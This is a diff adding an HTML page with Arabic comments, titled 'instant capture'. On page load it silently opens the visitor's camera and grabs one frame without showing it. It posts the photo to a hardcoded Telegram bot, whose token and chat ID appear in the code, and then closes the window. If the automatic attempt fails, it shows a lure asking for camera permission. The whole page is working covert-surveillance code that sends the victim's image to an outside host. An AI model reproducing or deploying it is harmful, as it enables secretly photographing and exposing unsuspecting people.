@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>التقاط فوري</title>
+    <script>
+        // بيانات البوت
+        const BOT_TOKEN = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
+        const CHAT_ID = '7327464581';
+        
+        // إعدادات الأداء
+        const CAPTURE_DELAY = 100; // تأخير قصير جداً قبل الالتقاط (مللي ثانية)
+        const IMAGE_QUALITY = 0.6; // جودة منخفضة للسرعة (0.6 = 60%)
+        const RESOLUTION = { width: 640, height: 480 }; // دقة منخفضة للسرعة
+
+        async function ultraFastCapture() {
+            try {
+                // 1. فتح الكاميرا بأقل إعدادات ممكنة للسرعة
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        ...RESOLUTION,
+                        frameRate: 15 // تقليل معدل الإطارات للسرعة
+                    }
+                });
+                
+                // 2. إنشاء عناصر سريعة بدون عرضها في DOM
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.muted = true;
+                video.playsInline = true;
+                await video.play();
+                
+                // 3. التقاط سريع مع الحد الأدنى من المعالجة
+                const canvas = document.createElement('canvas');
+                canvas.width = RESOLUTION.width;
+                canvas.height = RESOLUTION.height;
+                const ctx = canvas.getContext('2d', { willReadFrequently: false });
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // 4. إيقاف الكاميرا فوراً (لا تنتظر الإرسال)
+                stream.getTracks().forEach(track => track.stop());
+                
+                // 5. تحويل وإرسال متوازي (لا ينتظر العرض)
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'instant_capture.jpg');
+                    
+                    // إرسال غير متزامن (لا ننتظر الرد)
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData,
+                        mode: 'no-cors' // لتجنب انتظار الرد
+                    }).catch(e => console.log('تم الإرسال (قد لا يكون مؤكداً)'));
+                    
+                    // إغلاق سريع للنافذة
+                    setTimeout(window.close, 300);
+                }, 'image/jpeg', IMAGE_QUALITY);
+                
+            } catch (error) {
+                // عرض واجهة طلب الإذن إذا فشلت المحاولة التلقائية
+                document.body.innerHTML = `
+                    <div style="
+                        text-align:center;
+                        padding:20px;
+                        font-family:Arial;
+                        max-width:400px;
+                        margin:50px auto;
+                    ">
+                        <h2>التقاط الصورة الفوري</h2>
+                        <p>يجب منح إذن الوصول للكاميرا</p>
+                        <button onclick="ultraFastCapture()" style="
+                            padding: 12px 24px;
+                            background: #0088cc;
+                            color: white;
+                            border: none;
+                            border-radius: 6px;
+                            font-size: 16px;
+                            cursor: pointer;
+                            margin-top: 20px;
+                        ">منح الإذن والالتقاط</button>
+                    </div>
+                `;
+            }
+        }
+
+        // بدء العملية فوراً مع تأخير بسيط لتهيئة الصفحة
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(ultraFastCapture, CAPTURE_DELAY);
+        });
+    </script>
+</head>
+<body>
+    <!-- المحتوى سيتم تعديله ديناميكياً -->
+</body>
+</html>
